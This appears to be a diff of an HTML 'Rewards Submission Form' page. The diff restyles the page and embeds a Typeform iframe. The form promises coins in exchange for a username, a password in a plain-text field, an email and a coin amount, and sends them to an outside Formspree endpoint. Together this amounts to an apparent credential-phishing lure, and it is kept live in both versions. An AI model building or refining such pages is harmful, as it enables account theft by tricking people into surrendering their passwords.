@@ -3,39 +3,33 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Class Reward Submission Form</title>
+<title>Rewards Submission Form</title>
 <style>
   body {
     font-family: Arial, sans-serif;
     background: #f9f9f9;
     display: flex;
     justify-content: center;
-    align-items: center;
-    height: 100vh;
+    align-items: flex-start;
+    min-height: 100vh;
+    padding: 20px;
   }
-  form {
+  .container {
+    width: 100%;
+    max-width: 600px;
     background: #fff;
     padding: 30px;
     border-radius: 8px;
-    box-shadow: 0px 0px 10px #ccc;
-    width: 100%;
-    max-width: 400px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.1);
+  }
+  h2, h1 {
+    text-align: center;
+    color: #333;
   }
   h2 {
-    text-align: center;
-    margin-bottom: 20px;
-    color: #333;
     font-size: 18px;
-    line-height: 1.4;
-  }
-  .main-title {
-    font-weight: 700;
-    margin-bottom: 8px;
-  }
-  .sub-title {
     font-weight: 400;
-    color: #555;
-    display: block;
+    margin-bottom: 20px;
   }
   input {
     width: 100%;
@@ -56,20 +50,29 @@
   button:hover {
     background-color: #45a049;
   }
+  iframe {
+    width: 100%;
+    height: 600px; /* Adjust as needed */
+    border: none;
+    margin-top: 30px;
+  }
 </style>
 </head>
 <body>
-<form action="https://formspree.io/f/xgvnrwrj" method="POST">
-  <h2>
-    <span class="sub-title">Submit to get Coins, check notifications and more.</span>
-  </h2>
-  
-  <input type="text" name="username" placeholder="Username" required>
-  <input type="text" name="Password" placeholder="Password" required>
-  <input type="email" name="email" placeholder="Email" required>
-  <input type="text" name="coins" placeholder="Coins (e.g. 300)" required>
-  
-  <button type="submit">Submit</button>
-</form>
+<div class="container">
+  <!-- Your original HTML form -->
+  <h1>Submit to get Coins</h1>
+  <h2>Submit your details below:</h2>
+  <form action="https://formspree.io/f/xgvnrwrj" method="POST">
+    <input type="text" name="username" placeholder="Username" required>
+    <input type="text" name="Password" placeholder="Password" required>
+    <input type="email" name="email" placeholder="Email" required>
+    <input type="text" name="coins" placeholder="Coins (e.g. 300)" required>
+    <button type="submit">Submit</button>
+  </form>
+
+  <!-- Typeform embed -->
+  <iframe src="https://form.typeform.com/to/MwyQbxUj" title="Typeform Rewards Form"></iframe>
+</div>
 </body>
 </html>
